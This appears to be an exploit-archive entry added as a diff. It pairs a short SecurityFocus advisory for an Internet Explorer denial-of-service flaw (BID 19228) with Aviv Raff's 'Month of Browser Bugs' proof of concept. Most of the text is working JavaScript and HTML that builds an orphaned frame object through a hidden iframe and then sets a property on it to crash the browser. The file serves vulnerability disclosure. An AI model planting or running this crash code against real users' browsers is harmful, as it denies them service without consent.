@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/19228/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability. This issue is triggered when an attacker convinces a victim user to visit a malicious website.
+
+Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.
+
+// MoBB Demo
+			// Provided by Aviv Raff
+			// http://aviv.raffon.net/
+			
+            var orphanObject;
+
+            function createOrphanObject() {
+                orphanObject=document.frames["emptyFrame"].document.getElementById("emptyObject").object.parentWindow.document.createElement("frame");
+                document.frames["emptyFrame"].location.href="about:blank";
+                window.setTimeout('crashBrowser()',1);
+            }
+
+            function crashBrowser() {
+                orphanObject.frameBorder="whateveryoulike";
+            }
+
+            function insertEmptyObject() {
+                return '<OBJECT id="emptyObject" data="nonexist.html" type="text/html"></OBJECT>';
+            }
+        
+        
+        <iframe id="emptyFrame" src="javascript:parent.insertEmptyObject()" style="display:none"></iframe>
+        
+        Clicking the button below may crash your browser!<br><br>
+        <input type='button' onClick='createOrphanObject()' value='Start Demo!'>
